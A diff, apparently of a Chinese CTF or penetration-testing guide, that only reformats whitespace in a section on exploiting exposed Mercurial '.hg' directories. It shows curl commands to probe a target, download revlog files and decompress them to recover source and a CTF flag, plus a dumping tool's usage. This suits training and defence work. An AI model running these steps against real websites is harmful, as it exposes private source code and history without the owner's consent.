@@ -12,25 +12,25 @@
 
 ```mermaid
 flowchart LR
-    A[开发者 hg clone] --> B[生成 .hg/]
-    B --> C[开发者把项目部署到 web 服务器]
-    C --> D[/.hg/store/fncache 可直接 HTTP 下载]
-    D --> E[解析明文文件清单]
-    E --> F[下载 revlog + zlib 解压 → 还原源码]
+ A[开发者 hg clone] --> B[生成 .hg/]
+ B --> C[开发者把项目部署到 web 服务器]
+ C --> D[/.hg/store/fncache 可直接 HTTP 下载]
+ D --> E[解析明文文件清单]
+ E --> F[下载 revlog + zlib 解压 → 还原源码]
 ```
 
 #### Mercurial 仓库目录结构
 
 ```
 .hg/
-├── requires            ← 格式特性标志（明文，必存在）
-├── dirstate            ← 工作副本跟踪状态（明文）
+├── requires ← 格式特性标志（明文，必存在）
+├── dirstate ← 工作副本跟踪状态（明文）
 ├── store/
-│   ├── fncache         ← ★ 文件清单（明文，列出所有存储路径）
-│   ├── 00changelog.i   ← 提交历史 revlog
-│   ├── 00manifest.i    ← 目录树 revlog（文件名→node 映射）
-│   └── data/
-│       └── <文件名>.i  ← 每个文件的 revlog（含压缩内容）
+│ ├── fncache ← ★ 文件清单（明文，列出所有存储路径）
+│ ├── 00changelog.i ← 提交历史 revlog
+│ ├── 00manifest.i ← 目录树 revlog（文件名→node 映射）
+│ └── data/
+│ └── <文件名>.i ← 每个文件的 revlog（含压缩内容）
 ```
 
 | 文件 | 作用 | 泄露价值 |
@@ -47,17 +47,17 @@ flowchart LR
 `.i` 文件 = revlog 格式，每个文件有若干**版本（rev）**。索引项 **64 字节**、大端序：
 
 ```
-偏移   长度   字段
-0:6    6B    offset（数据偏移）
-6:8    2B    flags
-8:12   4B    zlen（压缩后长度）
-12:16  4B    ulen（解压后长度）
-16:20  4B    base（全量版本的 rev 序号）
-20:24  4B    link（关联 changelog 序号）
-24:28  4B    parent1
-28:32  4B    parent2
-32:52  20B   node（SHA-1）
-52:64  12B   padding
+偏移 长度 字段
+0:6 6B offset（数据偏移）
+6:8 2B flags
+8:12 4B zlen（压缩后长度）
+12:16 4B ulen（解压后长度）
+16:20 4B base（全量版本的 rev 序号）
+20:24 4B link（关联 changelog 序号）
+24:28 4B parent1
+28:32 4B parent2
+32:52 20B node（SHA-1）
+52:64 12B padding
 ```
 
 | 项目 | 说明 |
@@ -75,9 +75,9 @@ HG 的 revlog **不会因为文件删除而清除历史版本**——`hg remove`
 
 ```bash
 # 最小确认集（三个请求）
-curl -s -o /dev/null -w "%{http_code}" "http://目标/.hg/requires"              # 200 + 格式特性 → 泄露
-curl -s -o /dev/null -w "%{http_code}" "http://目标/.hg/store/fncache"        # 200 + 文件清单 → 泄露确认
-curl -s -o /dev/null -w "%{http_code}" "http://目标/.hg/store/00changelog.i"  # 200 → 提交历史
+curl -s -o /dev/null -w "%{http_code}" "http://目标/.hg/requires" # 200 + 格式特性 → 泄露
+curl -s -o /dev/null -w "%{http_code}" "http://目标/.hg/store/fncache" # 200 + 文件清单 → 泄露确认
+curl -s -o /dev/null -w "%{http_code}" "http://目标/.hg/store/00changelog.i" # 200 → 提交历史
 ```
 
 | 状态 | 含义 |
@@ -113,7 +113,7 @@ curl -s "http://目标/.hg/requires"
 curl -s "http://目标/.hg/store/fncache"
 # data/index.html.i
 # data/50x.html.i
-# data/flag_221058597.txt.i    ← 这就是 flag 的 revlog
+# data/flag_221058597.txt.i ← 这就是 flag 的 revlog
 
 # 3. 下载 flag 的 revlog 并解压（revlog v1 inline，64B 索引 + zlib）
 curl -s "http://目标/.hg/store/data/flag_221058597.txt.i" -o flag.i
@@ -136,9 +136,9 @@ print(text.decode())
 hgdump http://目标
 
 # 选项
-hgdump http://目标 --list        # 只列出探测结果，不下载
-hgdump http://目标 --out 目录     # 指定输出目录
-hgdump http://目标 --cat flag_xxx.txt  # 直接 cat 指定文件
+hgdump http://目标 --list # 只列出探测结果，不下载
+hgdump http://目标 --out 目录 # 指定输出目录
+hgdump http://目标 --cat flag_xxx.txt # 直接 cat 指定文件
 ```
 
 #### 手动对象链（理解原理）
@@ -161,13 +161,13 @@ print('总大小:', len(d), 'B')
 pos = 0
 i = 0
 while pos + 64 <= len(d):
-    e = d[pos:pos+64]
-    zlen = int.from_bytes(e[8:12],'big')
-    base = int.from_bytes(e[16:20],'big')
-    chunk = d[pos+64:pos+64+zlen]
-    text = zlib.decompress(chunk) if chunk[:1]==b'\x78' else chunk
-    print(f'rev{i}: base={base}, zlen={zlen}, data={text[:60]}')
-    pos += 64 + zlen; i += 1
+ e = d[pos:pos+64]
+ zlen = int.from_bytes(e[8:12],'big')
+ base = int.from_bytes(e[16:20],'big')
+ chunk = d[pos+64:pos+64+zlen]
+ text = zlib.decompress(chunk) if chunk[:1]==b'\x78' else chunk
+ print(f'rev{i}: base={base}, zlen={zlen}, data={text[:60]}')
+ pos += 64 + zlen; i += 1
 "
 
 # 3. 下载 flag revlog + 解压
